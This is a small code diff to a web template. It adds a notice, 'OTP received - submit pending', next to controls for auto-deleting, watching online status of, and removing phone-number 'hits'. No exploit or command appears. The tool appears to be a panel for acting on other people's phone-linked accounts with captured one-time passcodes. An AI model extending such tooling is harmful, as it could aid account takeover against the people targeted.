@@ -126,6 +126,7 @@ border-radius:10px;font-weight:800;font-size:12px;opacity:0;transform:translateY
       <button class="btn btn-sched" onclick="toggleAuto('a{{ loop.index0 }}')">⏰ Auto delete / online alert</button>
       <button class="btn btn-remove" onclick='removeHit({{ h.number|tojson }})'>✕ Remove hit</button>
       {% if h.job_id %}<span class="jobline">scheduled job {{ h.job_id }} (every {{ h.job_interval }}s)</span>{% endif %}
+      {% if h.pending_otp %}<span class="jobline">📥 OTP received - submit pending</span>{% endif %}
       {% if h.watch_id %}<span class="jobline">online watch {{ h.watch_id }}</span>{% endif %}
     </div>
     <div class="auto" id="a{{ loop.index0 }}">
